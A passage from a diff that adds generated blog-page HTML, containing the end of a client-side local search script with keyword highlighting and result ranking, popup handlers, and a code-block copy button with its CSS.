+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('Copied')
+          else $(this).text('Copy failed')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('Copy')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+ 
+</body>
+</html>
